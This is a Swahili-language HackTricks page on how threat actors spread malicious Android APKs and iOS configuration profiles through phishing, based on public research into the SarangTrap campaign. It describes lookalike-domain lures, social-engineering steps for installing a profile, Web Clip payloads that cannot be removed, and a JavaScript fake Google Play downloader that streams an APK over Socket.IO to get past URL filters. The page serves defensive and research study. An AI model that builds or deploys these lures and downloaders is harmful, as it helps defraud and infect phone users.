# Phishing ya Simu na Usambazaji wa Programu Hasidi (Android na iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unaeleza mbinu zinazotumiwa na wahusika tishio kusambaza **APK hasidi za Android** na **profaili za usanidi wa simu za iOS** kupitia phishing (SEO, uhandisi wa kijamii, maduka bandia, programu za uchumba, n.k.).
> Maudhui haya yamechukuliwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025), pamoja na utafiti mwingine wa umma.<sup>[[1]](#references)</sup>

## Mtiririko wa Mashambulizi

1. **Miundombinu ya SEO/Phishing**
   * Sajili dazeni za domain zinazofanana na halisi (uchumba, kushiriki kwenye cloud, huduma za magari…).
     – Tumia maneno muhimu ya lugha za eneo husika na emoji katika kipengele cha `<title>` ili kupata nafasi nzuri kwenye Google.
     – Weka maelekezo ya usakinishaji wa Android (`.apk`) na iOS kwenye ukurasa mmoja wa kutua.
2. **Upakuaji wa Hatua ya Kwanza**
   * Android: kiungo cha moja kwa moja cha APK *isiyotiwa saini* au ya “duka la wahusika wengine”.
   * iOS: kiungo cha `itms-services://` au HTTPS ya kawaida kinachoelekeza kwenye profaili hasidi ya **mobileconfig** (tazama hapa chini).
3. **Tabia ya Android Baada ya Usakinishaji**
   * Utekelezaji unaodhibitiwa na C2, matumizi mabaya ya ruhusa, mbinu za kukwepa vizuizi vya dropper, ukusanyaji wa data chinichini, na tabia nyingine za malware baada ya usakinishaji zimeelezwa kwenye ukurasa maalum wa Android Malware Post-Exploitation hapa chini.
4. **Mbinu ya Uwasilishaji ya iOS**
   * Profaili moja ya **usanidi wa simu** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kusajili kifaa kwenye usimamizi unaofanana na “MDM”.
   * Maelekezo ya uhandisi wa kijamii:
     1. Fungua Settings ➜ *Profile downloaded*.
     2. Gusa *Install* mara tatu (picha za skrini ziko kwenye ukurasa wa phishing).
     3. Iamini profaili isiyotiwa saini ➜ mshambuliaji hupata ruhusa za *Contacts* na *Photo* bila ukaguzi wa App Store.
5. **Payload ya Web Clip ya iOS (ikoni ya programu ya phishing)**
   * Payload za `com.apple.webClip.managed` zinaweza **kubandika URL ya phishing kwenye Home Screen** ikiwa na ikoni/jina lenye chapa.
   * Web Clip zinaweza kufanya kazi **kwenye skrini nzima** (huficha UI ya kivinjari) na kuwekwa kuwa **haziwezi kuondolewa**, hivyo kumlazimisha mwathiriwa kufuta profaili ili kuondoa ikoni.<sup>[[3]](#references)</sup>
6. **Tabaka la Mtandao**
   * HTTP ya kawaida, mara nyingi kwenye port 80 ikiwa na kichwa cha HOST kama `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → ni rahisi kutambua).

## Android Malware Baada ya Usakinishaji

Kwa mbinu za Android malware baada ya usakinishaji kama vile C2, matumizi mabaya ya Accessibility, overlays, uendeshaji otomatiki wa ATS, upakiaji wa DEX kwa hatua, SMS za malipo ya juu, na persistence, tazama:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Usafirishaji Haramu wa APK kwa Socket.IO/WebSocket + Kurasa Bandia za Google Play

Washambuliaji wanazidi kubadilisha viungo tuli vya APK na kutumia chaneli ya Socket.IO/WebSocket iliyopachikwa kwenye kurasa za ulaghai zinazofanana na Google Play. Hii huficha URL ya payload, hukwepa vichujio vya URL/viendelezi, na kudumisha mchakato halisi wa usakinishaji.<sup>[[2]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida wa mteja ulioonekana kwenye mashambulizi halisi:

<details>
<summary>Kipakua bandia cha Play kinachotumia Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Kwa nini hukwepa vidhibiti rahisi:
- Hakuna URL tuli ya APK inayowekwa wazi; payload huundwa upya kwenye memory kutoka kwa WebSocket frames.
- Vichujio vya URL/MIME/extension vinavyozuia majibu ya moja kwa moja ya .apk vinaweza kukosa binary data inayopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes zisizotekeleza WebSockets hazitapata payload.

Tazama pia mbinu na zana za WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Upande wa Giza wa Mapenzi: Kampeni ya Ulaghai ya SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Mipangilio ya payload ya Web Clips kwa vifaa vya Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Inayolenga Watumiaji wa Android nchini Indonesia na Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
